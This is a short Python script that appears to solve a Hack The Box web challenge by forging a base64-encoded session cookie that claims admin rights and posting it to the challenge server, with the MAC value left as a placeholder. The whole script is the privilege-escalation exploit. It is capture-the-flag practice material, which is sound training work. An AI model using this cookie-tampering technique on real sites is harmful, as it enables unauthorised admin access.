#!/usr/bin/env python
import base64
import requests

URL = 'http://docker.hackthebox.eu:31688/index.php'

ses_str = '{"User":"whocares","Admin":"True","MAC":<figure out yourself>}'
cookies = {'ses': base64.b64encode(ses_str)}
# It turns out that we cannot set post data. Otherwise it returns the same "not an admin".
# r = requests.post(URL, data={'fuckhtml':'notused'}, cookies=cookies);
r = requests.post(URL, cookies=cookies);
print(r.text)
